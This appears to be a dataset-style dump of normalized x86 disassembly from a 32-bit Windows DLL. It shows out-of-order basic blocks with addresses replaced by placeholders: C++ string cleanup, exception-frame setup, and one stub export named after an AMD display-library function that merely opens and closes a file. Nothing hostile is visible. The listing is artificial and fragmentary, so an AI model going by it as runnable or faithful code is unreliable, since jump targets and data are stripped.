add esp 0x4
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
push eax
call edi
xor edi edi
xor ecx ecx
mov esi 0x8
mov ebx 0x7
mov [ esp + 0xcc ] ebx
mov [ esp + 0xc8 ] edi
mov [ esp + 0xb8 ] cx
cmp [ esp + 0xe8 ] esi
jb r-xdata
mov eax [ esp + 0xb8 ]
push eax
call sub_100187af
add esp 0x4
mov [ esp + 0x400 ] 0x0
mov eax [ esp + 0x3c ]
mov ebx [ LocalFree@IAT ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x94 ]
push edx
call sub_100187af
add esp 0x4
mov eax [ esp + 0x48 ]
test eax eax
je r-xdata
push eax
call edi
xor eax eax
mov [ esp + 0xe8 ] ebx
mov [ esp + 0xe4 ] edi
mov [ esp + 0xd4 ] ax
cmp [ esp + 0xa8 ] esi
jb r-xdata
mov edx [ esp + 0xd4 ]
push edx
call sub_100187af
add esp 0x4
mov eax [ esp + 0x44 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov eax [ esp + 0x50 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esp + 0x400 ] 0x0
mov eax [ esp + 0x3c ]
mov ebx [ LocalFree@IAT ]
cmp eax edi
je r-xdata
mov ecx [ esp + 0x94 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ esp + 0x48 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov eax [ esp + 0x54 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esp + 0x44 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov eax [ esp + 0x50 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov eax [ esp + 0x58 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esp + 0x48 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov eax [ esp + 0x54 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov esi [ esp + 0x90 ]
test esi esi
je r-xdata
push eax
call edi
mov eax [ esp + 0x50 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov eax [ esp + 0x58 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov ebx [ esp + 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ esi ]
mov ebx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x54 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov esi [ esp + 0x90 ]
cmp esi edi
je r-xdata
push eax
call ebx
xor eax eax
mov edi [ esp + 0x28 ]
mov esi ebx
cmp ebx edi
je r-xdata
push esi
call edi
mov esi ebx
test ebx ebx
jne r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov eax [ esp + 0x58 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov ebx [ esp + 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ esi ]
mov edi [ esi + 0x4 ]
test ecx ecx
je r-xdata
push ebx
call sub_100187af
add esp 0x4
nop
mov esi [ esp + 0x90 ]
cmp esi edi
je r-xdata
push eax
call ebx
mov eax 0x4
jmp r-xdata
mov edi [ esp + 0x28 ]
mov esi ebx
cmp ebx edi
je r-xdata
push esi
call ebx
mov esi edi
test edi edi
jne r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] dx
add esi 0x24
cmp esi edi
jne r-xdata
mov ecx [ esi ]
push ecx
call sub_100187af
add esp 0x4
mov ebx [ esp + 0x24 ]
test ebx ebx
je r-xdata
nop
push ebx
call sub_100187af
add esp 0x4
mov edi edi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax 0x5
jmp r-xdata
mov edi [ esp + 0x28 ]
mov esi ebx
cmp ebx edi
je r-xdata
push esi
call ebx
mov esi edi
test edi edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x24
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
push ebx
call sub_100187af
add esp 0x4
lea esp [ esp ]
mov ecx [ esi ]
mov edi [ esi + 0x4 ]
test ecx ecx
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] dx
add esi 0x24
cmp esi edi
jne r-xdata
mov ecx [ esi ]
push ecx
call sub_100187af
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_10063d20
push ebp
mov ebp esp
push 0xffffffff
push sub_10089d9d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx edx
cmp [ ebx + 0xec ] 0x0
mov [ ebp - 0x128 ] eax
mov [ ebp - 0x12c ] ecx
jne r-xdata
push 0x4
lea esi [ ebp - 0x120 ]
mov edi ebx
call sub_10057a60
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x2
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0xf
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x84 ] al
call sub_10037e00
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov eax 0x42
jmp r-xdata
push esi
lea eax [ ebp - 0x120 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0x84 ]
call sub_10059c40
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
push esi
push ebx
lea eax [ ebp - 0x120 ]
call sub_10064570
mov edx [ ebp - 0x128 ]
push edx
mov [ ebp - 0x130 ] eax
lea eax [ ebp - 0xbc ]
push r--data
push eax
call sub_100403d0
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x120 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0xbc ]
call sub_10059c40
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_10064570
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0xd8 ]
push r--data
push edx
mov [ ebp - 0x128 ] eax
call sub_100403d0
add esp 0xc
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x38 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0xd8 ]
call sub_10059c40
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_10064570
push 0x227a9
lea esi [ ebp - 0x110 ]
mov [ ebp - 0x12c ] eax
call sub_1003e830
add esp 0x4
push eax
lea edx [ ebp - 0xa0 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x4
call sub_10057800
add esp 0xc
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0xfc ] 0x10
jb r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] 0x0
mov [ ebp - 0x110 ] 0x0
cmp ecx 0x3
ja r-xdata
mov eax [ ebp - 0x110 ]
push eax
call sub_100187af
add esp 0x4
lea eax [ esi + 0x54 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0xa0 ]
call sub_10059c40
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x54 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_10064570
mov ecx [ ebp - 0x130 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x124 ] eax
call sub_10041240
mov esi eax
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x7
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x8
call sub_1000be00
mov ecx eax
mov [ ebp - 0x4 ] 0x9
mov esi [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_1002d84e
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_1005e580
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1002d84e
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x128 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0xbc ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xa
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xb
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0xc
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_1005e580
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xd
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xe
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0xf
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x38 ]
push esi
call sub_1005e580
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x124 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x11
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x12
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x54 ]
push esi
call sub_1005e580
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_100187af
add esp 0x4
lea ecx [ ebp - 0xf4 ]
push ecx
lea edi [ ebp - 0x120 ]
call sub_10044960
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x13
mov [ ebp - 0x124 ] esp
push 0xffffffff
xor esi esi
push esi
lea edx [ ebp - 0xf4 ]
mov edi 0xf
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] esi
push edx
mov [ ecx ] 0x0
call sub_1004efe0
push esi
push ebx
call sub_10003290
mov ebx 0x10
mov [ ebp - 0x124 ] eax
cmp [ ebp - 0xe0 ] ebx
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] esi
mov [ ebp - 0xf4 ] 0x0
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov eax [ ebp - 0xf4 ]
push eax
call sub_100187af
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] 0x0
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
mov ecx [ ebp - 0xa0 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] esi
mov [ ebp - 0xd8 ] 0x0
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
mov edx [ ebp - 0xd8 ]
push edx
call sub_100187af
add esp 0x4
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xac ] esi
mov [ ebp - 0xbc ] 0x0
cmp [ ebp - 0x70 ] ebx
jb r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x120 ]
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] 0x0
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x124 ]
mov edx [ ebp - 0x124 ]
push edx
mov edx [ ebp - 0x11c ]
lea ecx [ ebp - 0x114 ]
push ecx
push edx
push eax
call sub_10028f80
mov eax [ ebp - 0x120 ]
push eax
call sub_100187af
add esp 0x14
sub_10064570
push ebp
mov ebp esp
push ecx
mov ecx [ eax ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ eax + 0x4 ]
mov [ ebp - 0x4 ] 0x0
cmp ecx edi
je r-xdata
mov ecx [ ebx + 0x14 ]
cmp ecx 0x10
jb r-xdata
lea ebx [ ebx ]
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov edx [ ebx + 0x10 ]
add edx eax
cmp ecx 0x10
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
add edx eax
cmp esi 0x10
jb r-xdata
and eax 0x8000003f
jns r-xdata
nop
xor eax eax
cmp ecx edx
je r-xdata
add [ ebp - 0x4 ] esi
add ecx 0x1c
cmp ecx edi
jne r-xdata
movsx ebx [ eax ]
inc eax
add esi ebx
cmp eax edx
jne r-xdata
xor esi esi
cmp eax edx
je r-xdata
mov ecx [ ebp - 0x4 ]
and ecx 0x3f
add eax ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
div [ ecx + 0x108 ]
pop edi
pop esi
pop ebx
mov eax edx
mov esp ebp
pop ebp
retn 0x8
dec eax
or eax 0xffffffc0
inc eax
movsx esi [ ecx ]
inc ecx
add eax esi
cmp ecx edx
jne r-xdata
mov esi [ ecx + 0x14 ]
cmp esi 0x10
jb r-xdata
mov ebx [ ebp + 0xc ]
sub_10064640
push ebp
mov ebp esp
push 0xffffffff
push sub_1008808a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0xffffffff
lea ecx [ edi + 0x4 ]
push esi
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] esi
push eax
mov [ ecx ] dx
call sub_100404a0
mov [ ebp - 0x4 ] esi
lea esi [ edi + 0x20 ]
mov [ esi ] r--data
mov [ esi + 0x10 ] r--data
mov [ ebp + 0xc ] esi
mov [ esi + 0x60 ] r--data
mov eax 0x1
lea ebx [ esi + 0x18 ]
push ebx
mov [ ebp - 0x4 ] al
push esi
mov [ ebp - 0x10 ] eax
call sub_10022d70
mov [ ebp - 0x4 ] 0x2
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
push ebx
mov [ esi + edx ] r--data
call sub_10006e20
xor eax eax
mov [ ebx + 0x3c ] eax
mov [ ebx + 0x40 ] eax
mov [ ebx ] r--data
mov [ edi + 0xc8 ] eax
mov [ edi + 0xcc ] eax
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_1006470e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10057f0f
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1003cbb0
int3
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100374b5
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100374b5
add esp 0x14
sub_100647f0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
push eax
mov [ esi ] r--data
call sub_10034c90
mov ecx [ esi + 0x10 ]
push ecx
call sub_10034c90
mov edx [ esi + 0x14 ]
push edx
call sub_10034c90
add esp 0xc
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_10064836
push 0x28
mov eax sub_1008558c
call sub_100624bc
and [ ebp - 0x10 ] 0x0
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
push 0x5
pop eax
call sub_10013ab8
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x1c
call sub_1001f84c
pop ecx
mov [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] eax
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
mov ecx [ ebp + 0x8 ]
push 0x0
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_10026122
jmp r-xdata
ADL_ApplicationProfiles_ProfileOfAnApplication_InMemorySearch
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
push r--data
call [ CreateFileW@IAT ]
push eax
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
lea eax [ eax * 4 - 0x14 ]
retn
sub_10064902
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp ebx edi
je r-xdata
push 0x5
pop eax
call sub_10013ab8
retn
cmp [ ebx ] edi
jne r-xdata
push 0x14
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] edi
cmp esi edi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx edi
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
mov [ esi + 0x4 ] edi
mov [ esi ] r--data
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x1
mov [ esi + 0x8 ] edi
call sub_10040209
jmp r-xdata
sub_10064990
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x14
sub_100649e0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
cmp [ edi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ edi ]
mov [ esi ] ecx
mov [ edi ] 0x0
mov edx [ edi + 0x10 ]
lea eax [ edx + edx + 0x2 ]
push eax
push edi
push esi
call sub_1007ec90
add esp 0xc
jmp r-xdata
mov edx [ edi + 0x10 ]
mov [ esi + 0x10 ] edx
mov eax [ edi + 0x14 ]
mov [ esi + 0x14 ] eax
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
sub_10064a60
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov edi [ esi + 0x24 ]
mov edx [ edi ]
test edx edx
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
push ebx
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x3c ]
cmp edx ecx
jae r-xdata
test [ esi + 0x40 ] 0x2
jne r-xdata
mov ecx [ esi + 0x34 ]
mov ebx [ ecx ]
mov edx edi
add ebx edx
cmp edx ebx
jae r-xdata
mov eax [ esi + 0x34 ]
mov eax [ eax ]
add eax edx
mov [ edi ] ecx
sub eax ecx
mov ecx [ esi + 0x34 ]
mov [ ecx ] eax
pop ebx
pop edi
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn 0x4
test edi edi
jne r-xdata
dec [ ecx ]
jmp r-xdata
mov eax [ esi + 0x34 ]
mov ecx [ esi + 0x10 ]
mov ebx [ eax ]
sub ebx [ ecx ]
add ebx edi
xor ebx ebx
jmp r-xdata
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
pop ebx
lea edx [ ecx + 0x1 ]
mov [ esi ] edx
pop edi
mov [ ecx ] al
pop esi
mov esp ebp
pop ebp
retn 0x4
test eax eax
je r-xdata
mov eax 0x20
jmp r-xdata
mov eax ebx
shr eax 0x1
cmp eax 0x20
jae r-xdata
mov edi edi
mov edx 0x7fffffff
sub edx eax
cmp edx ebx
jae r-xdata
test eax eax
jne r-xdata
shr eax 0x1
jne r-xdata
add eax ebx
push eax
lea ecx [ esi + 0x44 ]
mov [ ebp - 0x4 ] eax
call sub_100019c0
mov edi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x8 ] edx
test ebx ebx
je r-xdata
mov ecx [ esi + 0x14 ]
mov [ esi + 0x3c ] edi
mov [ ecx ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov ecx [ esi + 0x34 ]
mov eax [ ebp - 0x4 ]
mov [ ecx ] eax
test [ esi + 0x40 ] 0x4
jne r-xdata
push ebx
push edx
push edi
call sub_1007f5d0
mov edx [ ebp - 0x8 ]
add esp 0xc
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x10 ]
mov [ ecx ] edi
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] edi
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov ecx [ esi + 0x20 ]
mov [ ecx ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov eax [ esi + 0x24 ]
mov ecx edi
sub ecx edx
add [ esi + 0x3c ] ecx
mov eax [ eax ]
mov ecx [ esi + 0x14 ]
mov ebx edi
sub eax edx
sub ebx edx
add [ ecx ] ebx
mov ecx [ esi + 0x24 ]
add eax edi
mov [ ecx ] eax
mov ecx edi
sub ecx eax
add ecx [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
test [ esi + 0x40 ] 0x4
je r-xdata
test [ esi + 0x40 ] 0x1
je r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
mov eax [ esi + 0x20 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub eax edx
add eax edi
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
sub ecx eax
mov [ edi ] eax
mov eax [ esi + 0x30 ]
inc ecx
mov [ eax ] ecx
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov eax [ ebp + 0x8 ]
push edx
call sub_100187af
add esp 0x4
sub_10064c10
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10089173
